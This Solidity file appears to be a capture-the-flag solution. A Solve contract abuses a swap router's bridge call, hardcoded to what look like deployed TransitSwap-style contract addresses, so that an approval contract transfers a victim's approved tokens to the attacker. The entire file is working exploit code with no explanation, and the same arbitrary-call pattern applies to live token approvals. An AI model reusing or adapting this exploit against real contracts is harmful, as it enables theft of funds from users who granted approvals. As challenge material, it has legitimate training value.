// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/Challenge.sol";

contract Solve {
    Challenge chal;
    address constant TRANSIT_SWAP = 0x8785bb8deAE13783b24D7aFE250d42eA7D7e9d72;
    address constant APPROVE_GOV = 0xeD1afC8C4604958C2F38a3408FA63B32E737c428;

    struct OtherSwapDescription {
        address srcToken;
        address dstToken;
        address to;
        uint256 amountIn;
        uint256 amountOutMin;
        uint256 feeRateIndex;
        bool isCross;
        string channel;
        uint256 toChainID;
    }

    function solve(address _chal) external {
        chal = Challenge(_chal);

        uint256 bridgeIndex = 1;

        OtherSwapDescription memory desc = OtherSwapDescription({
            srcToken: address(0),
            dstToken: address(0),
            to: address(chal),
            amountIn: 0,
            amountOutMin: 0,
            feeRateIndex: 4,
            isCross: true,
            channel: "android",
            toChainID: 1
        });

        bytes memory bridgeData = abi.encode(
            APPROVE_GOV,
            0,
            address(0x0),
            "android",
            abi.encodeWithSelector(0x0a5ea466, address(chal.token()), _chal, address(this), 1 ether)
        );

        (bool done,) = TRANSIT_SWAP.call(abi.encodeWithSelector(0x006de4df, bridgeIndex, desc, bridgeData));
        require(done, "!done");
        require(chal.isSolved(), "!solve");
    }
}
